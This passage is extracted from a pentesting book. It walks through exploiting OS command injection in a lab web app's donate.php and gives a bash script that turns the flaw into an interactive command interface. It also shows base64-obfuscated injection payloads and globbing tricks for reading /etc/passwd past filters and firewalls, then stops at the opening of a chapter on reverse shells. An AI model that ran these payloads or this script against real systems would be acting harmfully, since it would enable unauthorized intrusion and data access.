@@ -1,0 +1,139 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 1 - Now, take a look at the amount_to_donate.txt file by browsing to http://172.16.10.12/amount_to_donate.txt. You should see that the 1 value we previously entered from the donate.php form was saved to this .txt file on the server. This indicates that some type of filesystem processing is being executed on the server, based on input from the web application, and that the form we discovered might be a good entry point for injected OS commands.
+Let’s attempt to perform OS command injection in the donate.php page. Submit the semicolon control operator (;) as well as the bash command id in the form. Unfortunately, a validation script seems to catch the semicolon character. You should see the message Character ; is not allowed displayed on the web page.
+Not to worry; we can try a different method. Let’s inject a pipe character (|) instead of a semicolon. As you can see in Figure 6-14, the input is accepted.
+Security Relevance Score: 11
+Word Count: 1574
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Now, take a look at the amount_to_donate.txt file by browsing to http://172.16.10.12/amount_to_donate.txt. You should see that the 1 value we previously entered from the donate.php form was saved to this .txt file on the server. This indicates that some type of filesystem processing is being executed on the server, based on input from the web application, and that the form we discovered might be a good entry point for injected OS commands.
+Let’s attempt to perform OS command injection in the donate.php page. Submit the semicolon control operator (;) as well as the bash command id in the form. Unfortunately, a validation script seems to catch the semicolon character. You should see the message Character ; is not allowed displayed on the web page.
+Not to worry; we can try a different method. Let’s inject a pipe character (|) instead of a semicolon. As you can see in Figure 6-14, the input is accepted.
+
+Figure 6-14: A successful OS command injection response
+
+If you check the amounts_to_donate.txt file, you should see evidence that the command was successfully injected into the file, as we’re able to identify the output of running the id command. In Figure 6-15, you can see that the www-data user is running the p-web-02 (172.16.10.12) web application.
+
+
+Figure 6-15: The injected command’s output
+
+Using the browser’s Inspect tool or a Burp Suite proxy, we can see that the OS command injection occurs by sending a GET request to /donate.php?amount=.
+Exercise 9: Building a Command Injection Interface
+Like the web shell interface you built in Exercise 8, develop a bash script that makes it easier to send commands to p-web-02 by exploiting its OS command injection vulnerability.
+This interface script should interact with the donate.php endpoint for sending commands as well as the amount_to_donate.txt endpoint for parsing and displaying the response of your commands. The script should also return only the response from the current command, not a full dump of all the previous command results in the amount_to_donate.txt file.
+Listing 6-2 shows an example solution.
+
+os-command -injection.sh
+#!/bin/bash
+
+read -rp 'Host: ' host
+read -rp 'Port: ' port
+
+while true; do
+  read -rp '$ ' raw_command
+  command=$(printf %s "${raw_command}" | jq -sRr @uri)
+
+  # Store the previous list of command outputs.
+❶ prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
+
+  # Execute the OS Command Injection vulnerability.
+❷ curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
+
+  # Store the new list of command outputs.
+❸ new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
+
+  # Extract only the difference between the two command outputs.
+❹ delta=$(diff --new-line-format="%L" \
+                       --unchanged-line-format="" \
+                       <(echo "${prev_resp}") <(echo "${new_resp}"))
+
+  # Output the command result.
+  echo "${delta}"
+
+done
+
+Listing 6-2: An OS command injection interface
+The code begins much like the web shell interface script: by collecting target connection details and beginning a while loop that prompts the user for commands to encode.
+Before sending the OS command injection request, the script first needs to take a snapshot of the amount_to_donate.txt file’s contents and save it to a variable called prev_resp ❶. We’ll discuss why we’re doing this shortly.
+Within the next curl request, we inject the amount parameter with the encoded command and prepend the 1| value to it ❷. After sending the curl request, we then send another snapshot request to capture the new amount_to_donate.txt file contents in the new_resp variable ❸.
+Finally, to display the correct output from the command, we run a diff operation to extract the difference between the prev_resp and the new_resp variables ❹. The diff output is stored in a delta variable, which showcases all the new amount_to_donate.txt file lines that were created after our injection.
+Try extending this script to make it more useful. For example, you could add support for viewing all commands that have been executed, along with their responses, by writing them to a file, then presenting them during the script’s runtime when a special command is used.
+
+
+Bypassing Command Injection Restrictions
+As we observed, developers often implement sanitization checks to prevent OS command injection attacks against their web applications. We got lucky, as the pipe (|) character wasn’t blocked in our target. Even so, it’s important to understand a few methods you could use to bypass command injection controls.
+
+Obfuscation and Encoding
+When we sent commands to a web shell earlier in this chapter, URL encoding requirements posed a challenge we needed to overcome. However, encoding and obfuscation may actually help us evade detection in some cases. Techniques like URL encoding, base64 encoding, and character encoding can hide the payload from security controls, checks, and filters.
+For example, we could base64-encode an entire command, such as ls -l, and hide it in the input. Test this encoding by sending the following payload to /donate.php:
+| $(echo 'bHMgLWw=' | base64 -d)
+You should receive a full filesystem listing of the web application’s present working directory.
+This technique aims to evade simple pattern-matching or filtering mechanisms used for detection. Basic techniques such as the use of regular expressions will have trouble identifying bash commands in the encoded bHMgLWw= string.
+
+
+Globbing
+Globbing is the process of using wildcard patterns to partially or fully match filenames or other content in files. A string is considered a wildcard pattern if it contains characters such as ?, *, [,], or !.
+Globbing is interesting because it allows us to specify patterns that expand to specific filenames or directories without actually providing the exact name, potentially bypassing accessing restrictions. Consider the /etc/passwd file on Linux. To view it, we could use ls, followed by the specific path and filename:
+$ ls -l /etc/passwd
+
+-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd
+
+But we could also run a command such as this one to list the file by using the ? wildcard character:
+$ ls -l /etc/p?sswd
+
+-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd
+
+Bash will try to match this pattern to files under the /etc directory. Since passwd is the only file with a name pattern that is similar, the ? character will expand to a, which matches passwd.
+We can use the same approach to access potentially restricted directories:
+$ ls -l /e??/passwd
+
+-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd
+
+Because no other directory names are three characters long and start with e at the root of the filesystem (/), the pattern will match the /etc directory.
+Globbing can get more extreme. How about filling in all characters with question marks except the last character? This, too, would match /etc/passwd if no similar filenames exist in the directory:
+$ ls -l /???/?????d
+
+-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd
+
+We can combine globbing with brace expansion to match more than one pattern under /etc. In the following example, bash will search for files that start with p and end with d, as well as files that start with g and end with p. This should match files such as /etc/passwd and /etc/group:
+$ ls /??c/{p????d,g???p}
+
+-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd
+
+Familiarizing yourself with features like globbing is helpful because you may run into applications (or even web application firewalls) that restrict the use of certain characters in input without taking into consideration globbing, allowing us to bypass filters and validations.
+For example, web application firewalls commonly block requests to URLs containing parameters such as http://example.com?file=/etc/passwd. Depending on how the application uses the filename, globbing may help bypass the firewall’s detection logic.
+
+
+
+Summary
+As you’ve seen in previous chapters, the power of the bash shell is undeniable, making popping a shell an exciting prospect. These shells open up possibilities for further exploitation and lateral movement on the target system.
+In this chapter, we gained low-privileged footholds into targeted systems by deploying web shells and injecting OS commands. We also used bash to craft accessible interfaces to these vulnerabilities and explored ways of obfuscating bash commands through strategies like globbing. In the next chapter, we’ll explore a few more techniques for establishing remote shells across different environments.
+
+
+
+
+
+
+
+
+
+
+
+
+7
+REVERSE SHELLS
+
+
+
+You’ve practiced gaining initial access to a target by establishing web shells that provide temporary, one-way network channels. In this chapter, we’ll explore a more stable initial access technique: using reverse shells, which swap the direction of the network communication. Attackers use these reverse connections from a compromised target machine to their own machine to gain reliable control over the compromised system and execute commands remotely in a more synchronized fashion.
+You’ll learn how to create a reverse shell, then make your communications with remote environments more robust. As a bonus, you’ll also learn how to brute-force your way into SSH servers by using bash as your battering ram.
+
+How Reverse Shells Work
+Often used for post-exploitation activities, reverse shells enable attackers to maintain control over a compromised system without directly connecting to it from their own machine, evading firewall restrictions.
+The term reverse refers to the direction of the initial network traffic. In a traditional shell or command execution flow, the attacker’s machine would typically be the one to connect to the compromised system to issue commands and control it. However, in the case of a reverse shell, the target is the one to reach out to the attacker. Let’s explore some principles of reverse shells.
+
+Ingress vs. Egress Controls
+Reverse shell communications help us bypass firewall rules, network restrictions, and other security measures designed to block incoming (ingress) connections, including those used in the OS command injection and web shell attacks we covered in
